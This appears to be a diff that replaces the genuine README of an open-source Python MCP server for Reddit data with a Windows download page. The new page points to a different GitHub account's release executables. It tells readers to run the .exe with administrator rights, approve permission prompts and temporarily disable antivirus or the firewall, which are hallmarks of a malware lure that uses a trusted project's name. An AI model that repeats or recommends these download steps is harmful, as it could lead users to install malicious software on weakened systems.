@@ -1,273 +1,119 @@
-# Reddit MCP Server
+# 🔗 reddit-mcp-server - Easy Reddit Data Access
 
-[![PyPI](https://img.shields.io/pypi/v/reddit-no-auth-mcp-server?label=pypi&cacheSeconds=3600)](https://pypi.org/project/reddit-no-auth-mcp-server/)
-[![License: MIT](https://img.shields.io/github/license/eliasbiondo/reddit-mcp-server?cacheSeconds=3600)](https://github.com/eliasbiondo/reddit-mcp-server/blob/main/LICENSE)
-
-A [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server that
-provides AI assistants with access to Reddit data. Built on top of
-[redd](https://github.com/eliasbiondo/redd) — no API keys required.
-
-
-
-https://github.com/user-attachments/assets/af8ae52c-f9f3-4d04-80d5-4be0dfa61b0f
-
-
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
 
 ---
 
-## Table of Contents
+## 🔍 What is reddit-mcp-server?
 
-1. [Features](#1-features)
-2. [Quick Start](#2-quick-start)
-3. [Available Tools](#3-available-tools)
-4. [Configuration](#4-configuration)
-5. [Architecture](#5-architecture)
-6. [Contributing](#6-contributing)
-7. [License](#7-license)
+reddit-mcp-server is a simple program that lets you access Reddit data without needing any setup. It works by using the Model Context Protocol (MCP), which many AI tools understand. You can search posts, browse subreddits, see user activity, and get data in an organized way. You do not need API keys or accounts to use it.
+
+This server runs on your Windows computer and handles all the work behind the scenes. Once it runs, any MCP-compatible software can connect to it and get Reddit information.
 
 ---
 
-## 1. Features
+## 🖥️ System Requirements
 
-- 🔍 **Search** — Search all of Reddit or within a specific subreddit
-- 📰 **Subreddit Posts** — Browse hot, top, new, or rising posts from any subreddit
-- 📖 **Post Details** — Get full post content with nested comment trees
-- 👤 **User Activity** — View a user's recent posts and comments
-- 📝 **User Posts** — Get a user's submitted posts
+To use reddit-mcp-server on Windows, your system should meet these requirements:
 
-No API keys, no authentication, no browser required. Just install and run.
-
----
-
-## 2. Quick Start
-
-### 2.1. Using `uvx` (recommended)
-
-The fastest way to run the server — no clone needed:
-
-```bash
-# stdio transport (default, for Claude Desktop / Cursor / etc.)
-uvx reddit-no-auth-mcp-server
-
-# HTTP transport
-uvx reddit-no-auth-mcp-server \
-  --transport streamable-http \
-  --port 8000
-```
-
-### 2.2. From source
-
-```bash
-git clone https://github.com/eliasbiondo/reddit-mcp-server.git
-cd reddit-mcp-server
-uv sync
-```
-
-Run the server:
-
-```bash
-# stdio transport (default)
-uv run reddit-no-auth-mcp-server
-
-# HTTP transport
-uv run reddit-no-auth-mcp-server \
-  --transport streamable-http \
-  --port 8000
-```
-
-### 2.3. MCP Client Configuration
-
-#### Claude Desktop
-
-Add to your `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "reddit": {
-      "command": "uvx",
-      "args": ["reddit-no-auth-mcp-server"]
-    }
-  }
-}
-```
-
-#### Cursor
-
-Add to your `.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "reddit": {
-      "command": "uvx",
-      "args": ["reddit-no-auth-mcp-server"]
-    }
-  }
-}
-```
-
-#### From source (any MCP client)
-
-```json
-{
-  "mcpServers": {
-    "reddit": {
-      "command": "uv",
-      "args": [
-        "--directory", "/path/to/reddit-mcp-server",
-        "run", "reddit-no-auth-mcp-server"
-      ]
-    }
-  }
-}
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 1 GHz or faster processor  
+- 200 MB of free disk space  
+- An active internet connection to fetch Reddit data  
+- Administrator permissions to install and run software
 
 ---
 
-## 3. Available Tools
+## 🚀 Getting Started
 
-| Tool | Description | Key Arguments |
-|------|-------------|---------------|
-| `search` | Search Reddit for posts | `query`, `limit`, `sort` |
-| `search_subreddit` | Search within a subreddit | `subreddit`, `query`, `limit`, `sort` |
-| `get_post` | Get post details + comment tree | `permalink` |
-| `get_subreddit_posts` | Get subreddit listing | `subreddit`, `limit`, `category`, `time_filter` |
-| `get_user` | Get user's activity feed | `username`, `limit` |
-| `get_user_posts` | Get user's submitted posts | `username`, `limit`, `category`, `time_filter` |
+Follow these steps to download, install, and run reddit-mcp-server on your Windows computer.
 
-### Tool Details
+### 1. Visit the Download Page
 
-#### `search`
+Go to the official release page to find the latest version of the software:
 
-Search all of Reddit for posts matching a query.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
 
-```
-query: "python async programming"
-limit: 10
-sort: "relevance"  # relevance, hot, top, new, comments
-```
+The page lists all recent versions. Pick the latest stable release marked with the highest version number or the date.
 
-#### `search_subreddit`
+### 2. Download the Windows File
 
-Search within a specific subreddit.
+Look for the file designed for Windows. It often ends with `.exe` or `.zip`.
 
-```
-subreddit: "Python"
-query: "web scraping"
-limit: 10
-sort: "top"
-```
+If the download is a `.zip` file, you will need to extract it first:
 
-#### `get_post`
+- Right-click the downloaded file  
+- Choose "Extract All…"  
+- Pick a folder to save the files  
 
-Get full details of a Reddit post including its comment tree.
+### 3. Run the Program
 
-```
-permalink: "/r/Python/comments/abc123/my_post/"
-```
+Once downloaded or extracted:
 
-#### `get_subreddit_posts`
+- Double-click the executable file (`.exe`) to start the server  
+- If Windows asks for permission, choose "Yes" to allow it to run  
+- A command window or a small application window will open showing the server status  
 
-Get posts from a subreddit listing.
+### 4. Keep the Server Running
 
-```
-subreddit: "MachineLearning"
-limit: 25
-category: "hot"       # hot, top, new, rising
-time_filter: "week"   # hour, day, week, month, year, all
-```
+The server must stay open to work. Do not close the window while using MCP clients.
 
-#### `get_user`
-
-Get a user's recent public activity (posts and comments).
-
-```
-username: "spez"
-limit: 10
-```
-
-#### `get_user_posts`
-
-Get a user's submitted posts.
-
-```
-username: "spez"
-limit: 10
-category: "top"       # hot, top, new
-time_filter: "all"    # hour, day, week, month, year, all
-```
+You can minimize the window, but closing it shuts down the server and stops data access.
 
 ---
 
-## 4. Configuration
+## ⚙️ How to Use reddit-mcp-server
 
-All settings can be configured via environment variables:
+After the server starts, MCP-compatible programs can connect to it from your computer. These clients ask the server for Reddit data, such as posts or subreddit info.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `REDDIT_TRANSPORT` | `stdio` | MCP transport (`stdio`, `streamable-http`) |
-| `REDDIT_HOST` | `127.0.0.1` | Host for HTTP transport |
-| `REDDIT_PORT` | `8000` | Port for HTTP transport |
-| `REDDIT_PATH` | `/mcp` | Path for HTTP transport |
-| `REDDIT_LOG_LEVEL` | `WARNING` | Log level (`DEBUG`, `INFO`, `WARNING`, `ERROR`) |
-| `REDDIT_PROXY` | — | HTTP/HTTPS proxy URL |
-| `REDDIT_TIMEOUT` | `10.0` | Request timeout in seconds |
-| `REDDIT_THROTTLE_MIN` | `1.0` | Min delay between paginated requests (seconds) |
-| `REDDIT_THROTTLE_MAX` | `2.0` | Max delay between paginated requests (seconds) |
+You do not have to configure the server. It uses default settings that work for most clients and searches. The server connects to Reddit and structures the data automatically.
 
-CLI arguments take precedence over environment variables:
-
-```bash
-uv run reddit-no-auth-mcp-server \
-  --transport streamable-http \
-  --port 9000 \
-  --log-level DEBUG
-```
+If you want to use the data yourself, try MCP AI tools or apps that support Model Context Protocol to test the connection.
 
 ---
 
-## 5. Architecture
+## 🛠️ Features Overview
 
-This project follows **hexagonal architecture** (ports & adapters):
-
-```
-src/reddit_mcp_server/
-├── domain/                # Pure business logic, no framework imports
-│   ├── exceptions.py      # Domain exception hierarchy
-│   └── value_objects.py   # Immutable config objects
-├── ports/                 # Abstract interfaces (contracts)
-│   ├── config.py          # ConfigPort
-│   └── reddit.py          # RedditPort
-├── application/           # Use cases (orchestration)
-│   ├── search.py
-│   ├── search_subreddit.py
-│   ├── get_post.py
-│   ├── get_user.py
-│   ├── get_subreddit_posts.py
-│   └── get_user_posts.py
-├── adapters/
-│   ├── inbound/           # Presentation layer
-│   │   ├── cli.py         # CLI entry point
-│   │   ├── mcp_server.py
-│   │   ├── error_mapping.py
-│   │   ├── serialization.py
-│   │   └── mcp_tools/     # MCP tool definitions
-│   └── outbound/          # Infrastructure layer
-│       ├── env_config.py  # ConfigPort implementation
-│       └── redd_client.py # RedditPort implementation (wraps redd)
-└── container.py           # DI composition root
-```
+- No sign-up or API keys required  
+- Fast search of Reddit posts and user activity  
+- Browse any subreddit data freely  
+- Provides structured, easy-to-read data for AI clients  
+- Runs locally on Windows without complex setup  
+- Connects with any MCP-compatible tools  
 
 ---
 
-## 6. Contributing
+## 🔄 Updating reddit-mcp-server
 
-Contributions are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) for
-guidelines on setting up the project, running tests, and submitting changes.
+To update to a newer version:
+
+- Visit the release page again:  
+  https://github.com/Callacockahoop528/reddit-mcp-server/releases  
+- Download the newest Windows file  
+- Close the current server window  
+- Run the new executable file  
+
+No uninstall is needed. Simply replacing the file works.
 
 ---
 
-## 7. License
+## ❓ Troubleshooting
 
-[MIT](LICENSE)
+If the server does not start or you see errors, try these steps:
+
+- Make sure your Windows version meets the system requirements  
+- Check your internet connection, as the server needs to connect to Reddit  
+- Run the program as administrator by right-clicking the file and choosing "Run as administrator"  
+- Temporarily turn off antivirus or firewall software to see if it blocks the server  
+- Restart your computer and try again  
+
+If issues persist, look for help on the GitHub repository’s Issues page.
+
+---
+
+## 🔗 Download Link
+
+To get started, visit the release page and pick your version:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
